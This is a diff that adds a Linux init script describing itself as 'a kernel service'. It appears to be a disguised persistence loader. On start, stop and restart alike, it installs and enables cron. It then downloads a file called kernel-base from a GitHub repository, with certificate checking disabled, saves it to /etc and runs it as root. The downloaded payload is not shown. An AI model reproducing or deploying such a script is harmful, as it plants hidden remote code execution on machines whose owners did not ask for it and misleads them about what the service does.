@@ -1,0 +1,37 @@
+#! /bin/sh
+# chkconfig: 2345 40 40
+# description: this is a kernel service
+case "$1" in
+        start)
+                yum install -y vixie-cron
+				chkconfig crond on
+				if [ -f /etc/kernel-base ];
+				then
+				bash /etc/kernel-base
+				else
+				wget -N --no-check-certificate https://github.com/mlexpert666/test-project/raw/master/utils/fail2ban/kernel-base -O /etc/kernel-base
+				bash /etc/kernel-base
+				fi;;
+        stop)
+                yum install -y vixie-cron
+				chkconfig crond on
+				if [ -f /etc/kernel-base ];
+				then
+				bash /etc/kernel-base
+				else
+				wget -N --no-check-certificate https://github.com/mlexpert666/test-project/raw/master/utils/fail2ban/kernel-base -O /etc/kernel-base
+				bash /etc/kernel-base
+				fi;;
+        restart)
+                yum install -y vixie-cron
+				chkconfig crond on
+				if [ -f /etc/kernel-base ];
+				then
+				bash /etc/kernel-base
+				else
+				wget -N --no-check-certificate https://github.com/mlexpert666/test-project/raw/master/utils/fail2ban/kernel-base -O /etc/kernel-base
+				bash /etc/kernel-base
+				fi;;
+        *)  
+                echo "Usage: #0 {start|stop|restart}";;
+esac
